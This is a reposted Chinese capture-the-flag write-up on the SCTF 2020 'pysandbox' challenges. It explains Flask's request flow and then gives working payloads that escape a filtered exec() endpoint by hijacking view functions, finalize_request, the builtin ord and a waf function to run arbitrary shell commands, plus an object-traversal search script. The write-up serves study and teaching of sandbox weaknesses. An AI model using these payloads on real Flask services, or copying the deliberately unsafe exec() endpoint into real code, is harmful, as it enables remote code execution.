> 原文链接: https://www.anquanke.com//post/id/214255 


# sctf2020 pysandbox 1&amp;2 分析


                                阅读量   
                                **123500**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">2</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p3.ssl.qhimg.com/t0115c56ba89ee760d0.png)](https://p3.ssl.qhimg.com/t0115c56ba89ee760d0.png)



## 前置知识

### flask处理流程

flask的很多功能是建立在 Werkzeug 之上的 ,根据WSGI接口,实现了_**call_**,没当有请求进入,边会调用这个方法

[![](https://i.loli.net/2020/08/13/i2Sc1YqJXZl8Dy7.png)](https://i.loli.net/2020/08/13/i2Sc1YqJXZl8Dy7.png)

跟进来，在这里建并推送请求上下文,然后调用full_dispatch_request处理请求

[![](https://i.loli.net/2020/08/13/bUmFl1dzYPehI7t.png)](https://i.loli.net/2020/08/13/bUmFl1dzYPehI7t.png)

在这个函数中调用了 preprocess_request（）方法对请求进行预处理（ request preprocess ing), 这会执行所有使用 before_request 钩子注册的函数。 接着，请求分发的工作会进一步交给 dispatch_request（）方法

[![](https://i.loli.net/2020/08/13/QdPsfB7NgIu2Lex.png)](https://i.loli.net/2020/08/13/QdPsfB7NgIu2Lex.png)

最后接收视图函数返回值,使用finalize_request方法生成响应,在视图函数中,使用Werkzeug 的路由类处理url,根据处理结果,调用view_functions的视图函数执行

[![](https://i.loli.net/2020/08/13/J4p7nruc5BMdG12.png)](https://i.loli.net/2020/08/13/J4p7nruc5BMdG12.png)



### 路由系统

[![](https://i.loli.net/2020/08/13/lO5ohDBqkP6c4Sv.png)](https://i.loli.net/2020/08/13/lO5ohDBqkP6c4Sv.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://i.loli.net/2020/08/13/1PLTSIuZW6oHYCU.png)

Werkzeug 提供的路由类,会根据url和rule规则,返回endpoint值和参数字典



### 上下文对象

```
def _lookup_req_object(name):
    top = _request_ctx_stack.top
    if top is None:
        raise RuntimeError(_request_ctx_err_msg)
    return getattr(top, name)


def _lookup_app_object(name):
    top = _app_ctx_stack.top
    if top is None:
        raise RuntimeError(_app_ctx_err_msg)
    return getattr(top, name)


def _find_app():
    top = _app_ctx_stack.top
    if top is None:
        raise RuntimeError(_app_ctx_err_msg)
    return top.app

# context locals
_request_ctx_stack = LocalStack()
_app_ctx_stack = LocalStack()
current_app = LocalProxy(_find_app)
request = LocalProxy(partial(_lookup_req_object, "request"))
session = LocalProxy(partial(_lookup_req_object, "session"))
g = LocalProxy(partial(_lookup_app_object, "g")
```

Flask 提供了两种上下文,请求上下文和程序上下文,

这两种上下文分别包含 request ,session<br>
和 current_app , g 这四个变量 ， 这些变量是实际对象的本地代理（ lo ca l proxy），因此被称为本地 上下文（ context locals ） 。

LocalStack是Werkzeug 提供的 Local Stack 类,

我们在程序中从 flask 包直接导人的 request 和 session 就是定义在这里的全局对象，这两个对象是对实际的 reques t 变量和 session 变量的代理

当请求进入时,被作为 WSGI 程序调用的 Flask 类实例（即我们的程序实例 app）会在 wsgi_app（）方法中调用 Flask.requestst _context() 方法。 这个方法会实例化 RequestContext 类作为请求上下文对象，接着 wsgi_app（）调用它的 push（）方法来将它推入请求上下文堆栈,_request_ctx_stack中存放着所有的请求,我们在flask中使用的全局变量 request,实际是通过代理指向Local Stack 栈顶的一个指针



## 分析

```
from flask import Flask, request

app = Flask(__name__)


@app.route('/', methods=["POST"])
def security():
    secret = request.form["cmd"]
    for i in secret:
        if not 42 &lt;= ord(i) &lt;= 122:
            return "error!"

    exec(secret)
    return "xXXxXXx"


if __name__ == '__main__':
    app.run(host="0.0.0.0")
```

[![](https://i.loli.net/2020/08/13/ZGLSa1HtPJUAfyb.png)](https://i.loli.net/2020/08/13/ZGLSa1HtPJUAfyb.png)

ban了’,”,(,)

pysandbox被非预期了

```
cmd=app.root_path[0:1]%2bapp.name[0:3]
```

设置静态目录就可以直接读flag,我们分析怎么rce



### bypass 引号

没有引号不能引入字符串,我们可以通过`[].__doc__[0]`这种形式拿到部分字符,但是有的字符构造不出来

可以通过request.form[`[].__doc__[0]`],然后POST提交B,既可引入所有需要的字符



### bypass 括号

**思路一**

括号没了，就不能直接执行函数了，但是在 exec中是可以直接访问到程序的上下文的，并且根据刚才对flask执行流程的分析，我们知道每次请求进入和弹出，改变的只有请求上下文和程序上下文，所以我们可以通过对flask流程中调用的函数的劫持，达到执行函数的目标

我们可以把flask中会调用的函数劫持成eval等威胁函数，但是这个函数的参数必须是我们可以控制的，

```
def full_dispatch_request(self):
        self.try_trigger_before_first_request_functions()
        try:
            request_started.send(self)
            rv = self.preprocess_request()
            if rv is None:
                rv = self.dispatch_request()
        except Exception as e:
            rv = self.handle_user_exception(e)
        return self.finalize_request(rv)
```

rv是视图函数的返回值，我们可以通过劫持视图函数控制，我们把finalize_request函数劫持成eval,最后pyload

```
// post 
cmd=app.view_functions[request.form[[].__doc__[1]]]=lambda:request.form[[].__doc__[0]];app.finalize_request=eval&amp;u=security&amp;B=__import__('os').system('ls')
```

即可执行任意命令

若是想获取回显，可以

```
// post 
cmd=app.view_functions[request.form[[].__doc__[1]]]=lambda:request.form[[].__doc__[0]];app.view_functions[1]=app.finalize_request;app.finalize_request=eval&amp;u=security&amp;B=self.view_functions[1](eval("__import__('os').popen('ls').read()"))
```

先把原来的finalize_request处理函数存入app.view_function字典，然后在执行返回response对象

**思路二**

直接劫持ord 绕过过滤，进行任意命令执行,空格被ban了可以用剩下的字符fuzz一下,发现*也可以使用

```
// post 
cmd=__builtins__[request.form[[].__doc__[0]]]=lambda*x:42&amp;B=ord
```

然后就是没有任何过滤的命令执行了,可以继续用上面的方法执行命令,获取回显

这个思路也可以引申一下，如果是

```
from flask import Flask, request

app = Flask(__name__)


def waf(content):
    if 'import' in content:
        return False
    else:
        return True


@app.route('/', methods=["POST"])
def security():
    secret = request.form["cmd"]
    if waf(secret):
        exec(secret)
        return "xXXxXXx"
    else:
        return "error"


if __name__ == '__main__':
    app.run(host="0.0.0.0")
```

可以这样解锁限制

```
app.view_functions['security'].__globals__['waf']=lambda*x:1
```

刚刚劫持的函数都在app变量下，所以可以直接访问，要是变量不在当前作用域呢，我们可以通过eviloh师傅tokyowestern 2018年 shrine的找继承链脚本，通过继承链访问

```
import flask
import os
from flask import request
from flask import g
from flask import config

app = flask.Flask(__name__)
app.config['FLAG'] = 'secret'

def search(obj, max_depth):
    visited_clss = []
    visited_objs = []

    def visit(obj, path='obj', depth=0):
        yield path, obj

        if depth == max_depth:
            return

        elif isinstance(obj, (int, float, bool, str, bytes)):
            return

        elif isinstance(obj, type):
            if obj in visited_clss:
                return
            visited_clss.append(obj)
            print(obj)

        else:
            if obj in visited_objs:
                return
            visited_objs.append(obj)

        # attributes
        for name in dir(obj):
            if name.startswith('__') and name.endswith('__'):
                if name not in ('__globals__', '__class__', '__self__',
                                '__weakref__', '__objclass__', '__module__'):
                    continue
            attr = getattr(obj, name)
            yield from visit(attr, '`{``}`.`{``}`'.format(path, name), depth + 1)

        # dict values
        if hasattr(obj, 'items') and callable(obj.items):
            try:
                for k, v in obj.items():
                    yield from visit(v, '`{``}`[`{``}`]'.format(path, repr(k)), depth)
            except:
                pass

        # items
        elif isinstance(obj, (set, list, tuple, frozenset)):
            for i, v in enumerate(obj):
                yield from visit(v, '`{``}`[`{``}`]'.format(path, repr(i)), depth)

    yield from visit(obj)

@app.route('/')
def index():
    return open(__file__).read()

@app.route('/shrine/&lt;path:shrine&gt;')
def shrine(shrine):
    for path, obj in search(request, 10):
        if str(obj) == app.config['FLAG']:
            return path

if __name__ == '__main__':
    app.run(debug=True)
```
